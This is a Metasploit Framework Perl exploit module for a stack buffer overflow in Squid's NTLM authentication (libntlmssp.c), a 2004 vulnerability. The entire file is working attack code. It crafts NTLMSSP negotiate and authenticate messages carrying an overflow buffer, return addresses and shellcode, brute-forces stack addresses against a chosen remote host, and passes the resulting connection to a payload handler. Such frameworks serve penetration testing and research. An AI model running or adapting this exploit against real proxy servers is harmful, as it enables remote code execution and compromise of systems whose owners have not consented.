##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::squid_ntlm_authenticate;

use strict;
use base "Msf::Exploit";

my $advanced = 
{ 
	'StackBottom' => [ '0xbfffcfbc', 'Start address for stack ret.'     ],
	'StackTop'    => [ '0xbffffffc', 'Stop address for stack ret.'      ],
	'StackStep'   => [ 0,  'Number of bytes to increment between steps.'],
	'BruteWait'   => [ 15, "Length of time to wait between brutes.  " .
	                       "15 is recommend as squid has a failure  " .
	                        "count tracker to exit on many segvs"       ],
};

my $info =
{
	'Name'          => 'Squid NTLM Authenticate Overflow',
	'Version'       => '$Revision: 1.7.2.2 $',
	'Authors'       => 
		[
			'skape <mmiller [at] hick.org>'	
		],
	'Description'   => 
		qq{
			This is an exploit for Squid's NTLM authenticate overflow (libntlmssp.c).
			Due to improper bounds checking in ntlm_check_auth, it is possible to 
			overflow the 'pass' variable on the stack with user controlled data of
			a user defined length.  Props to iDEFENSE for the advisory.
		},
	'Arch'          => [ 'x86' ],
	'OS'            => [ 'linux' ],
	'Priv'          => 0,
	'UserOpts'      => 
		{
			'RHOST'   => [ 1, 'ADDR', 'The target proxy server address' ],
			'RPORT'   => [ 1, 'PORT', 'The target proxy server port'    ],
		},
	'Payload'       => 
		{
			'Space'   => 300 - 44, # can be more, but requires code mod
			'MinNops' => 16,
			'PrependEncoder' => "\x83\xec\x7f",           # sub $0x7f, %esp
			'Prepend' => "\x31\xc9\xf7\xe1\x8d\x58\x0e" . # signal(SIGALRM, SIG_IGN)
			             "\xb0\x30\x41\xcd\x80",
		},
	'Refs'          => 
		[
			'http://www.idefense.com/application/poi/display?id=107',
                        'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2004-0541',
		],
	'DefaultTarget' => -1,
	'Targets'       =>
		[
			[ 'Brute force',                                0x0,        0x0        ],
			[ 'Squid 2.5 STABLE5 and below (Debian/Linux)', 0xbfffd48c, 0xbfffd468 ],
		],
};

sub new
{
	my $class = shift;
	my $self;
	
	$self = $class->SUPER::new(
			{ 
				'Info'     => $info,
				'Advanced' => $advanced,
			},
			@_);

	return $self;
}

sub Exploit
{
	my $self = shift;
	my $targetIdx  = $self->GetVar('TARGET');
	my $payload    = $self->GetVar('EncodedPayload');
	my $shellcode  = $payload->Payload;
	my $target     = $self->Targets->[$targetIdx];
	my $ret        = $target->[1];
	my $valid      = $target->[2];
	my $s          = undef;

	$self->PrintLine('[*] Trying exploit target ' . $target->[0]);

	if ($target->[0] eq 'Brute force')
	{
		my $stackTop    = hex($self->GetLocal('StackTop'));
		my $stackBottom = hex($self->GetLocal('StackBottom'));
		my $stackStep   = $self->GetLocal('StackStep');
		my $wait        = $self->GetLocal('BruteWait');

		$stackStep = $payload->NopsLength if ($stackStep == 0);

		for ($ret = $stackBottom, $valid = $stackBottom - 0x20;
		     $ret < $stackTop;
		     $ret += $stackStep, $valid += $stackStep)
		{
			$self->PrintLine(sprintf("[*] Trying %.8x...", $ret));

			last if (defined($s = $self->transmitExploit(target => $target, 
					shellcode => $shellcode, ret => $ret, valid => $valid)));

			sleep($wait);
		}
	}
	else
	{
		$s = $self->transmitExploit(target => $target, 
				shellcode => $shellcode, ret => $ret, valid => $valid);
	}

	$self->Handler($s) if (defined($s));
}

sub transmitExploit
{
	my $self = shift;
	my ($target, $shellcode, $ret, $valid) = @{{@_}}{qw/target shellcode ret valid/};
	my $targetHost = $self->GetVar('RHOST');
	my $targetPort = $self->GetVar('RPORT');
	my $bof        = "A" x 0x20 . pack("V", $ret) . pack("V", $valid) . "\xff\x00\x00\x00";
	my $passLen    = pack("v", length($bof) + length($shellcode));

	my $negotiate = 
		"NTLMSSP\x00"        . # NTLMSSP identifier
		"\x01\x00\x00\x00"   . # NTLMSSP_NEGOTIATE
		"\x07\x00\xb2\x07"   . # flags
		"\x01\x00\x09\x00"   . # workgroup len/max       (1)
		"\x01\x00\x00\x00"   . # workgroup offset        (1)
		"\x01\x00\x03\x00"   . # workstation len/max     (1)
		"\x01\x00\x00\x00"   ; # workstation offset      (1)
	my $authenticate = 
		"NTLMSSP\x00"        . # NTLMSSP identifier
		"\x03\x00\x00\x00"   . # NTLMSSP_AUTHENTICATE
		$passLen . $passLen  . # lanman response len/max
		"\x38\x00\x00\x00"   . # lanman response offset  (56)
		"\x01\x00\x01\x00"   . # nt response len/max     (1)
		"\x01\x00\x00\x00"   . # nt response offset      (1)
		"\x01\x00\x01\x00"   . # domain name len/max     (1)
		"\x01\x00\x00\x00"   . # domain name offset      (1)
		"\x01\x00\x01\x00"   . # user name               (1)
		"\x01\x00\x00\x00"   . # user name offset        (1)
		"\x00\x00\x00\x00"   . # session key
		"\x8b\x00\x00\x00"   . # session key
		"\x06\x82\x00\x02"   . # flags
		$bof . $shellcode;

	my $s = Msf::Socket->new;
	
	# Connect to the squid server
	if (!$s->Tcp($targetHost, $targetPort) || $s->IsError) 
	{
		$s->PrintError;
		return undef;
	}

	$self->PrintLine('[*] Sending NTLMSSP_NEGOTIATE (' . length($negotiate) . ' bytes)');

	# Transmit NTLMSSP negotiate
	if (not defined($self->transmitHttpRequest(
			s      => $s,
			buffer => $negotiate)))
	{
		$self->PrintLine('[-] Server did not send a response -- exploit failed.');
		return undef;
	}
	
	$self->PrintLine('[*] Sending NTLMSSP_AUTHENTICATE (' . length($authenticate) . ' bytes)');

	# Transmit NTLMSSP authenticate
	if (defined($self->transmitHttpRequest(
			s      => $s,
			buffer => $authenticate)))
	{
		return undef;
	}

	return $s;
}

sub transmitHttpRequest
{
	my $self = shift;
	my ($s, $buffer) = @{{@_}}{qw/s buffer/};
	my $encoded = encode_base64_perl($buffer);
	my $response;

	$encoded =~ s/\n//gm;

	$s->SetRecvTimeout(2);
	$s->Send("GET http://www.metasplizoit.com HTTP/1.0\r\n");
	$s->Send("Proxy-Connection: Keep-Alive\r\n");
	$s->Send("Proxy-Authorization: NTLM $encoded\r\n");
	$s->Send("\r\n");

	# Read a response, wait 5 seconds...
	while (defined($response = $s->Recv(-1, 5)))
	{
		last if ($response =~ "\r\n\r\n" or length($response) == 0);
	}

	$response = '' if ($s->GetError());

	return $response;
}

# ripped from RFP's libwhisker (temporary)
# ripped from MIME::Base64
sub encode_base64_perl 
{
    my $res = "";
    my $eol = $_[1];
    $eol = "\n" unless defined $eol;
    pos($_[0]) = 0;
    while ($_[0] =~ /(.{1,45})/gs) {
        $res .= substr(pack('u', $1), 1);
        chop($res);}
    $res =~ tr|` -_|AA-Za-z0-9+/|;
    my $padding = (3 - length($_[0]) % 3) % 3;
    $res =~ s/.{$padding}$/'=' x $padding/e if $padding;
    if (length $eol) {
        $res =~ s/(.{1,76})/$1$eol/g;
    } $res; 
}

1;

